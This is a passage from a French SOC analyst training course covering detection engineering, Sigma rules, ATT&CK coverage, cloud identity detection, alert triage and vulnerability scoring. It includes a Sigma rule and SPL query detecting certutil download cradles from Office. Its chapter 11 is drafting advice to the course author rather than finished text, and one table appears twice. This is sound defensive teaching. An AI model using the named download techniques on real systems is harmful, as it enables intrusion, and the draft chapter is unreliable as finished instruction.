> Karim utilise l'écosystème CyberShield pour l'investigation Norexia : CrowdStrike Falcon (EDR — process tree, isolation, collecte), Splunk (SIEM — corrélation multi-sources, requêtes SPL), TheHive (ticketing — documentation de l'investigation), et VirusTotal (enrichissement du hash de lib.dll). Le hash SHA-256 de lib.dll est soumis à VirusTotal : 0 détection. C'est un malware custom, non référencé — signe d'un attaquant qui investit dans l'évasion. Soumission à ANY.RUN : la DLL établit une connexion HTTPS vers `185.xx.xx.xx:443` avec un beaconing de 45 secondes et un user-agent custom. Le C2 est confirmé.

---

## PARTIE II — DÉTECTION : L'ART DE VOIR LES MENACES

*Comment les menaces deviennent des alertes. Cette partie enseigne les principes de détection, l'utilisation d'ATT&CK pour structurer la couverture, l'écriture de règles Sigma de qualité, et la détection dans les environnements cloud — le tout avec l'objectif de construire une capacité de détection durable, pas juste une collection de règles.*

---

### Chapitre 5 — Principes de la détection

#### 5.1 Les approches de détection

La détection par **signature / IoC** matche des indicateurs exacts : un hash, une IP, un domaine, un pattern de fichier. C'est rapide, précis (peu de FP), mais éphémère — l'attaquant change ses IoC en quelques heures. C'est le bas de la Pyramid of Pain.

La détection **comportementale** identifie des patterns d'activité suspects indépendamment des IoC : un process tree anormal (svchost.exe avec explorer.exe comme parent), une séquence d'actions caractéristique (logon réseau + accès LSASS + Kerberos TGS request en rafale = credential access), un volume de données sortantes anormal. Plus résiliente que la signature, mais plus de faux positifs — le comportement « suspect » peut être légitime (un admin IT qui fait un PsExec est identique à un attaquant qui fait un PsExec).

La détection par **anomalie statistique / ML** établit une baseline d'activité normale (le comportement habituel d'un utilisateur, d'une machine, d'un flux réseau) et détecte les écarts significatifs. Utile pour le beaconing (intervalles réguliers de connexion), l'impossible travel (connexion depuis deux pays en 1 heure), et les volumes anormaux. Fragile si la baseline est mal calibrée — un utilisateur qui change de comportement légitime (nouveau projet, voyage) déclenche des alertes.

La détection par **corrélation** croise plusieurs événements faibles qui ensemble forment un signal fort. Un 4624 type 3 isolé n'est rien. Un 4624 type 3 depuis un poste RH vers un DC + un 4769 RC4 + un 4648 avec le compte svc-backup en 10 minutes = une chaîne d'attaque (mouvement latéral → Kerberoasting → utilisation de credentials volées). La corrélation est l'approche la plus puissante et la plus complexe.

#### 5.2 Le compromis précision vs couverture

Une règle très spécifique (« certutil.exe avec l'argument -urlcache ET le parent winword.exe ») a peu de FP mais rate les variantes (l'attaquant utilise bitsadmin au lieu de certutil, ou PowerShell IWR au lieu de certutil). Une règle large (« tout processus enfant de winword.exe qui fait une connexion réseau ») couvre plus de variantes mais génère du bruit (les macros légitimes qui font des appels réseau). L'art du detection engineer est de trouver le point d'équilibre — et d'accepter que ce point bouge dans le temps (les attaquants s'adaptent, les faux positifs changent avec l'environnement).

---

### Chapitre 6 — MITRE ATT&CK pour le SOC

#### 6.1 ATT&CK comme ossature de la détection

MITRE ATT&CK n'est pas seulement un référentiel pour les rapports CTI — c'est l'ossature opérationnelle de la détection. Chaque règle de détection du SIEM doit être mappée à une ou plusieurs techniques ATT&CK (via les tags Sigma). Cette discipline permet de mesurer la couverture (quelles techniques sont détectées, lesquelles ne le sont pas) et de prioriser le développement.

#### 6.2 Les techniques prioritaires pour tout SOC

Toutes les 200+ techniques ne sont pas égales. Les techniques suivantes doivent être couvertes en priorité car elles sont utilisées par la quasi-totalité des acteurs et elles sont détectables avec des logs standard.

**Initial Access :** T1566.001/.002 (Phishing — Attachment / Link), T1190 (Exploit Public-Facing Application), T1078 (Valid Accounts). **Execution :** T1059.001/.003/.005 (PowerShell / Windows Command Shell / Visual Basic), T1204 (User Execution), T1047 (WMI). **Persistence :** T1053.005 (Scheduled Task), T1543.003 (Windows Service), T1547.001 (Registry Run Keys). **Privilege Escalation :** T1558.003 (Kerberoasting), T1003 (OS Credential Dumping). **Defense Evasion :** T1218 (Signed Binary Proxy Execution — rundll32, mshta, regsvr32), T1055 (Process Injection), T1070.001 (Clear Windows Event Logs). **Lateral Movement :** T1021.002 (SMB/Admin Shares — PsExec), T1021.001 (RDP). **Exfiltration :** T1041 (Exfiltration Over C2 Channel), T1567 (Exfiltration Over Web Service). **Command and Control :** T1071.001 (Web Protocols — HTTPS C2), T1105 (Ingress Tool Transfer).

#### 6.3 Le gap analysis en pratique

Le gap analysis croise deux informations : les TTP des acteurs qui menacent l'organisation (fournies par la CTI — cours CTI Ch.20) et la couverture de détection actuelle du SOC (quelles techniques sont couvertes par des règles). L'outil est **ATT&CK Navigator** : on colore la matrice en vert (technique couverte par au moins une règle testée), orange (technique partiellement couverte — la règle existe mais n'a pas été testée ou a un taux de FP élevé), et rouge (technique non couverte). Le résultat est un plan de développement priorisé : les techniques rouges utilisées par les acteurs pertinents sont les premières à couvrir.

---

### Chapitre 7 — Detection Engineering : écrire des règles de qualité

#### 7.1 Le cycle de vie d'une règle

Le detection engineering suit un cycle structuré. **Besoin :** quelle menace détecter, quel TTP, quel scénario d'attaque. **Données :** quel log source contient les traces (Event ID 1 Sysmon pour l'exécution, Event ID 4769 pour le Kerberoasting, logs proxy pour le C2 web). Le log est-il disponible et correctement parsé dans le SIEM ? **Logique :** quelle condition, quel seuil, quelle fenêtre temporelle. La logique doit cibler la procédure spécifique (pas juste la technique générique). **Rédaction Sigma :** le format pivot universel — la règle est écrite une fois en Sigma et convertie en SPL/KQL/EQL selon le SIEM de chaque client. **Conversion :** pySigma ou sigma-cli convertit la règle Sigma en requête native du SIEM. **Test :** la règle est exécutée sur les logs historiques (rétro-hunt) pour vérifier la détection et les FP. **Déploiement :** mise en production, monitoring du volume d'alertes. **Tuning :** ajustement des conditions et des exceptions basé sur les FP observés en production. **Revue :** revalidation périodique (la règle est-elle toujours pertinente ? l'environnement a-t-il changé ? les FP sont-ils maîtrisés ?).

#### 7.2 Sigma en profondeur

Structure complète d'une règle Sigma :

```yaml
title: Certutil Download Cradle from Office Application
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: |
    Detects certutil.exe being spawned by an Office application 
    to download a file, characteristic of macro-based malware delivery.
references:
    - https://attack.mitre.org/techniques/T1105/
    - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
author: SOC CyberShield
date: 2026/03/10
modified: 2026/03/10
tags:
    - attack.command_and_control
    - attack.t1105
    - attack.execution
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
    selection_certutil:
        Image|endswith: '\certutil.exe'
        CommandLine|contains:
            - 'urlcache'
            - 'verifyctl'
    condition: selection_parent and selection_certutil
falsepositives:
    - Legitimate certificate management triggered from Office 
      (rare but document if observed)
level: critical
```

Les **modifiers Sigma** donnent la puissance : `contains` (sous-chaîne), `endswith` (fin de chaîne — utile pour les chemins de fichiers), `startswith`, `all` (toutes les valeurs doivent matcher), `base64` (recherche la version base64 de la chaîne), `re` (regex). La **condition** combine les selections avec des opérateurs logiques (`and`, `or`, `not`, `1 of selection_*`, `all of selection_*`).

La **conversion** avec sigma-cli : `sigma convert -t splunk -p sysmon rule.yml` produit la requête SPL correspondante. Le résultat pour notre règle : `ParentImage="*\\winword.exe" OR ParentImage="*\\excel.exe" OR ParentImage="*\\powerpnt.exe" Image="*\\certutil.exe" (CommandLine="*urlcache*" OR CommandLine="*verifyctl*")`.

#### 7.3 La gestion des faux positifs

Le FP est l'ennemi n°1 du SOC : trop de FP → fatigue d'alerte → les analystes ne regardent plus → les vrais positifs sont noyés → les FN augmentent. Le paradoxe : réduire les FP en ajoutant des exceptions crée des angles morts (un attaquant qui compromet un compte exclu passe sous le radar).

Les bonnes pratiques : chaque exception est documentée (qui, pourquoi, quand, condition exacte), chaque exception est revue périodiquement (l'exception est-elle toujours justifiée ?), les exceptions ne suppriment pas l'événement — elles réduisent la sévérité ou le routent vers une file d'attente de vérification (l'événement reste visible pour le hunting), et le taux de FP est mesuré par règle (les règles à > 50 % de FP sont re-développées, pas juste supprimées).

---

### Chapitre 8 — YARA, Suricata et détection complémentaire

#### 8.1 YARA pour le SOC

YARA identifie et classifie les fichiers par pattern matching. L'analyste SOC l'utilise pour scanner des fichiers suspects (soumission à une sandbox avec règles YARA), enrichir les alertes EDR (le hash de l'alerte matche-t-il une règle YARA connue ?), et dans les pipelines d'analyse automatisée. La structure (meta, strings, condition) et les types de patterns (textuels, hexadécimaux, regex) avec les conditions avancées (filesize, entropy, combinaisons logiques).

#### 8.2 Suricata pour la détection réseau

Suricata (et Snort) applique des règles sur le trafic réseau en temps réel. Le SOC utilise les jeux de règles **Emerging Threats** (ET Open gratuit, ET Pro commercial) qui couvrent les signatures de malware réseau, les C2 connus, et les exploits. Les règles Suricata complètent Sigma (qui opère sur les logs) et YARA (qui opère sur les fichiers) en couvrant le trafic réseau.

---

### Chapitre 9 — Détection cloud, SaaS et identités

*L'identité est le nouveau périmètre. En 2025-2026, compromettre un compte cloud donne accès à plus de ressources que compromettre un endpoint. Ce chapitre place l'identité au centre de la détection.*

#### 9.1 L'identité comme terrain SOC principal

Dans un environnement hybride (AD on-premise + Azure AD/Entra ID + M365 + SaaS), l'identité n'est plus un sujet IAM périphérique — c'est devenu le terrain de jeu principal des attaquants et donc du SOC. Un token de session volé donne accès à toutes les ressources cloud de l'utilisateur sans jamais toucher un endpoint. Un mot de passe compromis via un infostealer donne accès au VPN, à M365, et potentiellement à l'AD on-premise. Les conditional access policies (MFA, device compliance, location) sont les nouveaux firewalls — et leurs contournements sont les nouvelles vulnérabilités.

#### 9.2 Détection Azure AD / Entra ID

Les scénarios de détection critiques : **impossible travel** (connexion depuis Paris à 09h00 puis depuis São Paulo à 09h30 — requête KQL Sentinel sur les SigninLogs avec calcul de distance géographique et de temps), **connexion sans MFA quand MFA est requis** (le conditional access policy a été contournée ou le token a été replay — signal critique), **token replay** (l'attaquant rejoue un token de session volé via un kit AitM — détectable par l'absence de MFA challenge sur une session qui devrait en avoir un, ou par une IP différente entre l'émission du token et son utilisation), **modification d'app registration** (ajout de credentials sur une application — technique de persistence cloud : l'attaquant crée un secret sur une app avec des permissions, puis l'utilise comme backdoor même après le reset du mot de passe de l'utilisateur), et **modification de conditional access** (désactivation de MFA ou ajout d'une exclusion — red flag immédiat).

#### 9.3 Détection M365

**BEC (Business Email Compromise) :** création de règle de forwarding Outlook (UAL : `New-InboxRule` avec `ForwardTo` ou `RedirectTo`), accès mailbox depuis une IP suspecte, envoi d'emails inhabituels (demande de virement, changement de RIB). **Exfiltration SharePoint/OneDrive :** téléchargement massif (`FileDownloaded` en volume anormal dans l'UAL), partage externe non autorisé (`SharingSet` avec un domaine externe), et synchronisation vers un device non géré. **Compromission Teams :** messages de phishing interne via Teams (moins surveillé que l'email, souvent un angle mort).

#### 9.4 Détection AWS

**IAM changes :** création d'utilisateurs (`CreateUser`), modification de policies (`AttachUserPolicy`, `PutUserPolicy`), création d'access keys (`CreateAccessKey`) — chaque appel API est dans CloudTrail. **S3 :** modification de bucket policy (rendre un bucket public — `PutBucketPolicy`), accès depuis une IP non autorisée. **CloudTrail tampering :** désactivation du logging (`StopLogging`, `DeleteTrail`) — l'anti-forensics cloud, signal critique immédiat.

#### 9.5 Fil rouge — FALCONWATCH : la dimension identité

> **🛡️ FALCONWATCH — Épisode 4**
>
> La compromission de WKS-PROD-112 n'est pas qu'un problème endpoint — c'est un problème identité. L'attaquant a obtenu les credentials de Marc Dubois et les utilise pour s'authentifier en réseau (4624 type 3) vers d'autres machines. Plus grave : le Kerberoasting ciblant `svc-scada` est une attaque identité pure — si le mot de passe est cracké, l'attaquant obtient un accès aux systèmes SCADA sans jamais exploiter de vulnérabilité technique. La détection de ce Kerberoasting (rafale de 4769 RC4 depuis WKS-PROD-112) est le moment pivot de l'investigation — c'est ce qui transforme un incident « phishing classique » en incident « accès OT critique ».

---

## PARTIE III — INVESTIGATION : MÉTHODES PAR DOMAINE

*Cette partie enseigne les méthodes d'investigation — comment l'analyste navigue dans les données pour comprendre ce qui s'est passé. La Partie IV (Use Cases) enseigne les grands schémas de menace et leur logique de détection/réponse. La Partie VIII applique le tout de bout en bout.*

---
### Chapitre 10 — Principes de l'investigation SOC

#### 10.1 Ce que signifie investiguer

Investiguer en SOC ne signifie pas « remplir un ticket ». Cela signifie comprendre ce qui s'est passé, avec quelle certitude, et quoi faire. L'investigation est un raisonnement structuré : l'analyste observe des faits (dans les logs), formule des hypothèses (ce qui pourrait s'être passé), les teste (en cherchant les données qui confirment ou contredisent), et conclut (avec un niveau de confiance explicite et des actions recommandées).

#### 10.2 Qualification des alertes : la taxonomie opérationnelle

Chaque alerte reçue par le SOC doit être classifiée. Cette classification est une compétence centrale du métier.

**True Positive (VP) :** l'alerte détecte une menace réelle. Action : investigation approfondie, confinement, escalade si nécessaire. Exemple : l'alerte « certutil download cradle from Office » sur WKS-PROD-112 est un VP — un document malveillant a effectivement exécuté un téléchargement.

**False Positive (FP) :** l'alerte se déclenche sans menace réelle — la logique de détection a matché sur une activité légitime. Action : documenter le FP, évaluer si la règle doit être tunée, clôturer le ticket. Exemple : l'alerte « PowerShell -EncodedCommand » se déclenche sur un script SCCM de déploiement — l'activité est légitime.

**Benign True Positive (BTP) :** l'alerte est techniquement correcte (la détection a bien vu ce qu'elle devait voir) mais l'action est légitime. Ce n'est PAS un faux positif — la règle fonctionne correctement. Action : documenter comme BTP (pas comme FP — la distinction est importante pour les métriques), évaluer si une exception est justifiée. Exemple : l'alerte « PsExec remote service creation » se déclenche quand un admin IT utilise PsExec pour un déploiement planifié — la détection est correcte (PsExec a bien été utilisé), mais l'usage est légitime.

**Inconclusive :** l'analyste ne peut pas déterminer si l'alerte est un VP ou un FP avec les données disponibles. Action : enrichir (chercher des données supplémentaires), escalader si le risque est élevé et le doute persiste. Ne JAMAIS clôturer un ticket en « inconclusive » sans avoir documenté ce qui a été vérifié et pourquoi la conclusion est impossible.

#### 10.3 Qualification de sévérité et critères d'escalade

La sévérité d'un incident VP combine la **criticité technique** (quel type de menace — phishing simple vs mouvement latéral vs ransomware) et la **criticité de l'asset** (un poste utilisateur standard vs un DC vs un serveur SCADA OIV).

| Sévérité | Critères | Exemples | Réponse |
|----------|----------|----------|---------|
| **Critique** | Compromission confirmée d'un asset critique, mouvement latéral actif, ransomware en cours, accès aux données sensibles | Kerberoasting sur un DC, ransomware en déploiement, accès SCADA non autorisé | Escalade immédiate, confinement en urgence, cellule de crise |
| **Haute** | Compromission confirmée d'un endpoint standard, exécution de malware, C2 actif | RAT avec beaconing actif, credential dumping sur un poste | Investigation L2 prioritaire, confinement rapide |
| **Moyenne** | Activité suspecte non confirmée comme malveillante, tentative détectée et bloquée | Phishing cliqué sans soumission de credentials, scan interne détecté | Investigation L2 dans les 4h |
| **Basse** | Anomalie mineure, policy violation, activité potentiellement suspecte | Impossible travel résolu par VPN, violation de politique d'usage | Investigation L1, clôture si bénin |

Les **critères d'escalade** (vers l'IR lead, le CERT, ou le RSSI) : mouvement latéral confirmé, compromission d'un compte privilégié (Domain Admin, admin cloud), accès à des données sensibles (R&D, finance, données personnelles), ransomware ou précurseurs (suppression des shadow copies, binaire de chiffrement identifié), compromission d'un asset OIV/critique, et doute sur l'étendue avec risque élevé.

#### 10.4 Le pivoting

Le pivoting est la technique qui permet de naviguer entre les entités pour reconstruire l'histoire. À partir d'une IP source dans une alerte firewall, l'analyste pivote vers le hostname (CMDB/DNS/DHCP), puis vers l'utilisateur connecté (logs d'authentification), puis vers l'activité de cet utilisateur (tous ses logs), puis vers les processus exécutés (EDR/Sysmon), puis vers les connexions réseau de ces processus (Sysmon Event 3, firewall), puis vers les fichiers créés (Sysmon Event 11), etc. Chaque pivot ouvre une nouvelle dimension de l'investigation.

--- 
### Chapitre 11 
|Référentiel|Question à laquelle il répond|Utilité SOC|
|---|---|---|
|**CVE**|De quelle vulnérabilité parle-t-on ?|Corrélation, recherche, suivi|
|**CWE**|Quel type de faiblesse est en cause ?|Compréhension technique, généralisation|
|**CVSS**|À quel point c’est sévère techniquement ?|Priorisation initiale|
|**EPSS**|Quelle probabilité d’exploitation ?|Priorisation menace, hunting|
|**KEV**|Est-ce exploité dans le réel ?|Urgence opérationnelle|

## **Chapitre 11 — Référentiels vulnérabilités utiles au SOC : CVE, CWE, CVSS, EPSS, KEV**

_Quand une alerte, un IOC ou un bulletin CTI mentionne une vulnérabilité, l’analyste SOC doit savoir exactement de quoi on parle. Ce chapitre pose les repères indispensables pour lire correctement une vulnérabilité, comprendre son niveau de risque réel, et l’intégrer dans la qualification d’incident sans confondre sévérité technique et gravité opérationnelle._

Ce chapitre s’intègre bien ici parce que ton cours passe, en Partie III, des **principes d’investigation** vers les **méthodes d’analyse et de qualification**. Il prépare naturellement le futur chapitre sur **CVSS v4 et le rescoring contextuel**, sans casser la logique des chapitres techniques d’investigation par domaine.

---

## **11.1 Pourquoi ce vocabulaire compte pour le SOC**

### Idée directrice

Avant même de parler de scoring, il faut éviter la confusion classique :

- une **CVE** n’est pas un score ;
- une **CWE** n’est pas une vulnérabilité exploitée ;
- un **CVSS** ne dit pas si l’incident est grave pour l’organisation ;
- un **EPSS** n’est pas une preuve d’exploitation ;
- une présence en **KEV** change fortement la lecture opérationnelle.

### Ce que tu peux développer

- En SOC, ces sigles apparaissent partout : alertes scanner, bulletins CERT, rapports CTI, tickets patching, rapports éditeurs, EDR, SIEM.
- Le problème n’est pas seulement de les connaître, mais de **savoir à quoi ils servent dans une décision opérationnelle**.
- Une mauvaise lecture peut conduire à deux erreurs :
    - sur-réagir à une vulnérabilité “critique” mais peu exploitable chez toi ;
    - sous-réagir à une vulnérabilité au score moyen mais activement exploitée.

### Message clé

**Le SOC ne lit pas une vulnérabilité pour faire de la théorie ; il la lit pour décider quoi investiguer, quoi escalader, et quoi prioriser.**

---

## **11.2 CVE — identifier précisément la vulnérabilité**

### Objectif

Expliquer la CVE comme **identifiant normalisé** d’une vulnérabilité.

### À couvrir

- Définition simple : une **CVE** est un identifiant unique attribué à une vulnérabilité connue.
- Exemple de format : `CVE-2025-XXXX`.
- Ce que permet une CVE :
    - parler tous de la même vulnérabilité ;
    - retrouver les bulletins éditeurs, NVD, CTI, règles de détection, IoC, PoC.
- Ce que **n’est pas** une CVE :
    - ce n’est pas un score ;
    - ce n’est pas une preuve d’exploitation ;
    - ce n’est pas une mesure de gravité.

### Angle SOC

Quand une alerte ou un bulletin mentionne une CVE, l’analyste doit pouvoir répondre :

- quel produit est concerné ;
- quelle version ;
- quel vecteur d’exploitation ;
- quels systèmes internes sont potentiellement exposés.

### Transition possible

> La CVE dit **de quelle vulnérabilité on parle**. Elle ne dit pas encore **pourquoi elle existe** ni **à quel point elle est dangereuse chez nous**.

---

## **11.3 CWE — comprendre la faiblesse sous-jacente**

### Objectif

Montrer que la CWE sert à comprendre la **nature du défaut** derrière la vulnérabilité.

### À couvrir

- Définition simple : une **CWE** décrit une **catégorie de faiblesse** logicielle ou de conception.
- Exemples : injection, contrôle d’accès défaillant, désérialisation, use-after-free, buffer overflow.
- Différence CVE / CWE :
    - **CVE** = instance précise d’une vulnérabilité ;
    - **CWE** = type de faiblesse plus général.

### Angle SOC

- Pour l’analyste SOC, la CWE aide à :
    - comprendre la logique d’exploitation ;
    - anticiper les artefacts à rechercher ;
    - généraliser le raisonnement à d’autres cas similaires.
- Exemple pédagogique :
    - plusieurs CVE différentes peuvent renvoyer à une même famille de faiblesse ;
    - donc plusieurs incidents distincts peuvent laisser des traces comparables.

### Message clé

**La CVE nomme le cas ; la CWE aide à comprendre le mécanisme.**

---

## **11.4 CVSS — mesurer la sévérité technique**

### Objectif

Présenter CVSS comme un **score de sévérité**, pas comme un verdict opérationnel absolu.

### À couvrir

- Définition simple : le **CVSS** sert à estimer la sévérité technique d’une vulnérabilité.
- Rappeler que le score externe est souvent le point de départ d’une lecture plus contextuelle.
- Tu peux introduire brièvement les idées suivantes sans entrer encore dans tout le détail v4 :
    - facilité d’exploitation ;
    - privilèges requis ;
    - interaction utilisateur ;
    - impact sur confidentialité, intégrité, disponibilité.

### Angle SOC

- Le CVSS aide à prioriser, mais ne suffit pas à lui seul.
- En investigation, il éclaire l’analyste sur le **potentiel technique** d’une vulnérabilité.
- Mais il ne remplace ni :
    - l’état réel de compromission ;
    - la criticité de l’actif ;
    - l’impact métier ;
    - la propagation observée.

### Message clé

**CVSS répond à “à quel point cette vulnérabilité est sévère techniquement ?”, pas à “à quel point l’incident est grave pour nous ?”**

Cette distinction est d’ailleurs exactement la logique du texte d’ajout CVSS v4 : séparer la **gravité IR de l’incident** de la **sévérité de la vulnérabilité**, puis utiliser le rescoring contextuel pour éclairer la décision.

---

## **11.5 EPSS — estimer la probabilité d’exploitation**

### Objectif

Introduire EPSS comme complément très utile au CVSS.

### À couvrir

- Définition simple : **EPSS** estime la probabilité qu’une vulnérabilité soit exploitée dans un horizon proche.
- Expliquer l’intérêt pratique :
    - deux vulnérabilités peuvent avoir un CVSS proche ;
    - mais une seule peut avoir une forte probabilité d’exploitation réelle.
- EPSS apporte une lecture plus dynamique, plus orientée menace.

### Angle SOC

- Très utile pour :
    - prioriser le hunting ;
    - prioriser la surveillance ;
    - appuyer les décisions de traitement rapide ;
    - distinguer la vulnérabilité “grave sur le papier” de celle qui risque de générer un incident demain matin.
- Important à préciser :
    - EPSS n’est **pas** une preuve que la vulnérabilité est déjà exploitée dans ton SI ;
    - c’est un indicateur de **probabilité**, pas un constat.

### Message clé

**CVSS regarde surtout la sévérité technique ; EPSS aide à regarder la vraisemblance d’exploitation.**

---

## **11.6 KEV — savoir si la menace est déjà réelle**

### Objectif

Montrer pourquoi la KEV a une valeur opérationnelle très forte pour le SOC.

### À couvrir

- Définition simple : une vulnérabilité présente en **KEV** est une vulnérabilité **connue comme exploitée dans le monde réel**.
- Là, on n’est plus dans l’hypothèse théorique, mais dans la menace observée.

### Angle SOC

- Si une CVE apparaît en KEV :
    - la vigilance monte immédiatement ;
    - le hunting devient prioritaire ;
    - la remédiation prend une autre urgence ;
    - la qualification d’une alerte liée à cette CVE change de ton.
- Cela rejoint bien le futur chapitre sur le rescoring, où le texte d’ajout insiste justement sur la dimension **Threat / exploitation active / Attacked / KEV** dans la priorisation contextuelle.

### Message clé

**KEV répond à la question : “est-ce que cette vulnérabilité est déjà exploitée pour de vrai ?”**

---

## **11.7 Bien lire l’ensemble : ce que chaque référentiel apporte**

### Objectif

Faire une section de synthèse très pédagogique.

### Tableau conseillé

|Référentiel|Question à laquelle il répond|Utilité SOC|
|---|---|---|
|**CVE**|De quelle vulnérabilité parle-t-on ?|Corrélation, recherche, suivi|
|**CWE**|Quel type de faiblesse est en cause ?|Compréhension technique, généralisation|
|**CVSS**|À quel point c’est sévère techniquement ?|Priorisation initiale|
|**EPSS**|Quelle probabilité d’exploitation ?|Priorisation menace, hunting|
|**KEV**|Est-ce exploité dans le réel ?|Urgence opérationnelle|

### Message clé

Cette sous-partie doit vraiment ancrer le réflexe :

- **CVE = identifiant**
- **CWE = cause/faiblesse**
- **CVSS = sévérité**
- **EPSS = probabilité**
- **KEV = exploitation réelle**

---

## **11.8 Ce que le SOC doit en faire concrètement**

### Objectif

Ramener immédiatement le chapitre à l’usage analyste.

### À couvrir

Quand une vulnérabilité apparaît dans une alerte, un ticket ou un bulletin :

1. **Identifier la CVE** concernée.
2. **Comprendre le type de faiblesse** via la CWE si pertinent.
3. **Lire le score CVSS** comme un indicateur de sévérité technique, pas comme une conclusion finale.
4. **Consulter EPSS / KEV** pour estimer la pression de menace.
5. **Croiser avec le contexte interne** :
    - exposition Internet ou non ;
    - actif critique ou non ;
    - exploit observé ou seulement théorique ;
    - contrôles compensatoires ;
    - indices d’exploitation dans les logs.
6. **Qualifier l’incident** selon la grille IR de l’organisation.

### Message clé

**Le SOC ne doit jamais raisonner sur un seul indicateur isolé.**  
Il doit croiser **référentiel vulnérabilité**, **renseignement menace** et **contexte opérationnel interne**.

Cette articulation prépare parfaitement ton prochain chapitre autonome sur **gravité d’incident, CVSS v4 et rescoring contextuel**, qui approfondira justement cette logique.

---

## **11.9 Fil rouge / mise en situation SOC**

Je te conseille fortement une petite sous-partie narrative, comme ton cours utilise déjà un **fil rouge FALCONWATCH**. Le document principal montre bien que ton cours s’appuie sur cette logique narrative récurrente.

### Format possible

> **🛡️ FALCONWATCH — Référentiel vulnérabilités en pratique**  
> Une alerte remonte sur un serveur exposé avec mention d’une CVE critique. Karim identifie l’ID CVE, vérifie la nature de la faiblesse, consulte le score CVSS, puis regarde si la vulnérabilité apparaît dans les listes de vulnérabilités activement exploitées. Il constate que la sévérité technique est élevée, mais que la vraie priorité opérationnelle dépend surtout de trois questions : le système est-il exposé, observe-t-on des traces d’exploitation, et l’actif concerné est-il critique pour le métier ?

L’objectif est de faire sentir que ces référentiels servent à **raisonner**, pas à réciter des définitions.

---

## **11.10 Transition vers le chapitre suivant**

Très important pour garder la fluidité du cours.

### Phrase de transition possible

> Connaître les référentiels ne suffit cependant pas. En investigation SOC, le point décisif n’est pas seulement de savoir qu’une vulnérabilité existe, mais de comprendre ce qu’elle représente dans l’environnement réel de l’organisation. C’est tout l’enjeu du chapitre suivant : distinguer la sévérité d’une vulnérabilité, la probabilité de son exploitation, et la gravité opérationnelle de l’incident qu’elle peut provoquer.

---

## Recommandation de forme

Vu ton cours, je garderais ce chapitre :

- **plus court** que les gros chapitres d’investigation ;
- assez **dense pour être utile** ;
- avec un style très **opérationnel** ;
- idéalement **8 à 10 pages max** si tu rédiges de façon développée.

Je te conseille cette structure finale :

- **11.1 Pourquoi ce vocabulaire compte pour le SOC**
- **11.2 CVE — identifier précisément la vulnérabilité**
- **11.3 CWE — comprendre la faiblesse sous-jacente**
- **11.4 CVSS — mesurer la sévérité technique**
- **11.5 EPSS — estimer la probabilité d’exploitation**
- **11.6 KEV — savoir si la menace est déjà réelle**
- **11.7 Bien lire l’ensemble : ce que chaque référentiel apporte**
- **11.8 Ce que le SOC doit en faire concrètement**
- **11.9 Fil rouge — mise en situation SOC**
- **11.10 Transition vers le chapitre suivant**
---
### Chapitre 12 - Qualification, catégorisation et évaluation de gravité

### 12.1 — Vulnérabilité exploitée : distinguer sévérité CVSS et gravité de l'incident

Lorsqu'un incident trouve son origine dans l'exploitation d'une vulnérabilité identifiée par une CVE, l'analyste SOC ne doit pas confondre deux choses fondamentalement différentes : la **sévérité de la vulnérabilité** (mesurée par CVSS) et la **gravité de l'incident** (évaluée par les critères IR de l'organisation). Les deux se nourrissent mutuellement, mais elles ne répondent pas à la même question.

La **gravité de l'incident** répond à : « à quel point l'incident est grave pour l'organisation ici et maintenant ? ». Elle est évaluée selon les critères IR propres : étendue de la compromission, privilèges obtenus par l'attaquant, propagation observée ou potentielle, exfiltration confirmée ou suspectée, impact métier (production arrêtée ? données critiques touchées ?), criticité des systèmes impactés, et obligations réglementaires (notification CNIL 72h, NIS2). C'est cette gravité qui détermine le niveau P1/P2/P3/P4 et déclenche les escalades.

La **sévérité CVSS de la vulnérabilité** répond à : « à quel point cette vulnérabilité est sévère dans notre environnement ? ». C'est une information qui éclaire la qualification, mais qui ne la remplace pas.

#### 12.2 Le problème du score CVSS Base brut

Une CVE publiée par un éditeur ou le NVD est accompagnée d'un score CVSS Base (v3.1 ou v4.0). Ce score est **générique** — il décrit la vulnérabilité dans l'absolu, sans tenir compte du contexte de l'organisation. Un CVSS Base de 9.8 sur un service exposé sur Internet avec un exploit public et des données de santé derrière est effectivement critique. Le même CVSS 9.8 sur un service isolé dans un VLAN de test sans données et avec un WAF devant ne l'est pas du tout.

Le problème opérationnel est que beaucoup d'organisations traitent le score Base comme un score final : le scanner remonte 150 « critiques » par semaine, les équipes sont saturées, et les vraies urgences se noient dans le bruit. La re-qualification contextuelle est ce qui rend le score exploitable.

#### 12.3 CVSS v4.0 : la structure qui permet la contextualisation

CVSS v4.0 (FIRST, publié fin 2023, supporté par le NVD) apporte une structure de scoring en quatre groupes de métriques qui améliore significativement la contextualisation par rapport à v3.1 :

Le groupe **Base** (la sévérité intrinsèque de la vulnérabilité — vecteur d'attaque, complexité, privilèges requis, interaction utilisateur, impacts CIA — ce qui existait déjà en v3.1). Le groupe **Threat** (remplace le « Temporal » de v3.1 — intègre l'état d'exploitation actif via Exploit Maturity : Unreported, PoC, Attacked — est-ce que cette vulnérabilité est exploitée in-the-wild ? si oui, la priorité monte). Le groupe **Environmental** (existait en v3.1 mais est mieux structuré en v4 — les Modified Base Metrics permettent de refléter les contrôles compensatoires et l'exposition réelle : Modified Attack Vector si le service n'est pas exposé sur Internet, Modified Privileges Required si un contrôle d'accès compense, les exigences de sécurité CIA adaptées à la criticité métier de l'actif). Le groupe **Supplemental** (nouveau en v4 — Safety, Automatable, Recovery, Value Density, Provider Urgency — des métriques qui enrichissent la contextualisation sans modifier le score numérique, mais en informant la décision opérationnelle).

CVSS v4 produit des scores différenciés selon le niveau de contextualisation appliqué : **CVSS-B** (Base seul — le score générique), **CVSS-BT** (Base + Threat — intègre l'état d'exploitation), **CVSS-BE** (Base + Environmental — intègre le contexte de l'organisation), **CVSS-BTE** (Base + Threat + Environmental — le score le plus contextualisé). Cette nomenclature force à expliciter quel niveau de contextualisation est appliqué — un progrès par rapport au v3.1 où la distinction était souvent floue.

#### 12.4 Le workflow de rescoring contextuel

En pratique, quand un incident est déclenché par l'exploitation d'une CVE connue :

(1) **Documenter le score externe** : le score CVSS-B publié par l'éditeur ou le NVD est la référence de départ. Il est conservé tel quel dans la fiche d'incident pour traçabilité.

